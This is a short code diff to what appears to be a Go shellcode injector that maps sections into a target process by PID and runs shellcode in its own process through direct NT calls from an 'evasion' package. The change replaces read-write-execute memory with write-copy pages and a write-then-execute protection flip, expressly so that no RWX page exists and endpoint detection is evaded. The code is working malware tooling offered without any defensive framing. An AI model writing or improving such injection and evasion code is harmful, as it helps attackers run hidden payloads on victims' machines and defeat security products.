@@ -208,7 +208,7 @@ func injectMapSection(sc []byte, pid uint32) error {
 	defer windows.CloseHandle(proc)
 
 	// Create a pagefile-backed section; max protection must cover both views.
-	hSection := evasion.NtCreateSection(uint64(len(sc)), windows.PAGE_EXECUTE_READWRITE)
+	hSection := evasion.NtCreateSection(uint64(len(sc)), windows.PAGE_EXECUTE_WRITECOPY)
 	if hSection == 0 {
 		return fmt.Errorf("NtCreateSection failed")
 	}
@@ -240,16 +240,19 @@ func injectMapSection(sc []byte, pid uint32) error {
 	return nil
 }
 
-// injectSelf allocates RWX memory in the current process and executes the
-// shellcode on a new thread. Used for testing / local execution.
+// injectSelf allocates memory in the current process, writes shellcode, then
+// flips to RX before creating the thread — no RWX page ever exists at rest.
 func injectSelf(sc []byte) error {
 	const selfProc = ^uintptr(0) // (HANDLE)-1
-	mem := evasion.NtAllocateVirtualMemory(selfProc, uintptr(len(sc)), windows.PAGE_EXECUTE_READWRITE)
+	mem := evasion.NtAllocateVirtualMemory(selfProc, uintptr(len(sc)), windows.PAGE_READWRITE)
 	if mem == 0 {
 		return fmt.Errorf("NtAllocateVirtualMemory failed")
 	}
 	dst := unsafe.Slice((*byte)(unsafe.Pointer(mem)), len(sc))
 	copy(dst, sc)
+	if !evasion.NtProtectRemote(selfProc, mem, uintptr(len(sc)), windows.PAGE_EXECUTE_READ) {
+		return fmt.Errorf("NtProtectVirtualMemory RW→RX failed")
+	}
 
 	th := evasion.NtCreateThreadEx(selfProc, mem)
 	if th == 0 {
